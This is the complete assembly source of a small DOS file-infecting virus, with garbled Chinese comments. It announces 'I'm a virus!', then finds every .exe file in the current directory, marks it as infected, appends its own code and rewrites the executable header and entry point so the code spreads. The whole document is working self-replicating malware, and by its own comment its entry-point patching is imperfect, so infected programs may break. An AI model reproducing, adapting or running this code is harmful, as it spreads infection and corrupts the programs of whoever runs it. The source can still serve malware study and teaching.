code segment
    assume cs:code
start:
    mov ax,cs
    mov ds,ax

    call virus
    
    cmp bp,0
    jnz source
    mov ah,4ch
    int 21h
source:
    push cs
    mov oldip,0
    push oldip
    retf

virus proc
    call locate
locate:
    pop bp
    sub bp,offset locate
    lea dx,[bp+offset string] ;����ַ���
    mov ah,09h
    int 21h

    lea dx,[bp+offset dta] ;��dta
    mov ah,1ah
    int 21h

    lea dx,[bp+offset filename] ;���ҵ�һ���ļ�
    mov cx,0
    mov ah,4eh
    int 21h
    jc error

modify:
    lea dx,[bp+offset dta] ;�ļ�����ַ
    add dx,1eh
    
    mov ax,3d02h ;���ļ�
    int 21h

    mov bx,ax
    
    mov ax,4200h ;���ļ�ͷ
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,3fh ;���ļ�ͷ
    mov cx,30h
    lea dx,[bp+offset head]
    mov si,dx
    int 21h

    cmp word ptr [si],5a4dh ;����Ƿ���exe
    jnz nextfile

    cmp word ptr [si+2ah],8888h ;����Ƿ��ѱ���Ⱦ
    je nextfile
    mov word ptr [si+2ah],8888h

    mov ax,word ptr [si+014h] ;����ԭ�������
    mov oldip,ax

    xor cx,cx ;���ļ�β
    xor dx,dx
    mov ax,4202h
    int 21h
                   
    lea dx,[bp+offset start] ;д�����
    lea cx,[bp+offset theend]
    sub cx,dx
    mov ah,40h
    int 21h

    mov ax,4202h ;�������ļ�����
    xor cx,cx
    xor dx,dx
    int 21h    
    mov cx,200h
    div cx
    inc ax
    mov word ptr [si+2],dx
    mov word ptr [si+4],ax
    
    mov word ptr [si+14h],0012h ;���������Գ�������������ڴ��ַ��
                                ;99%�����ط��Ͳ�����

    mov ax,4200h ;���ļ�ͷ����д
    xor cx,cx
    xor dx,dx
    int 21h
    mov ah,40h
    mov dx,si
    mov cx,30h
    int 21h

nextfile:
    mov ah,3eh ;�ر��ļ�
    int 21h

    mov ah,4fh ;������һ���ļ�
    int 21h
    jc error
    jmp modify

error:
    ret
virus endp

oldip dw 0
filename db "*.exe",0
dta db 02bh dup(0)
string db "I'm a virus!",13,10,'$'
head db 30h dup(0)

theend:
code ends
end start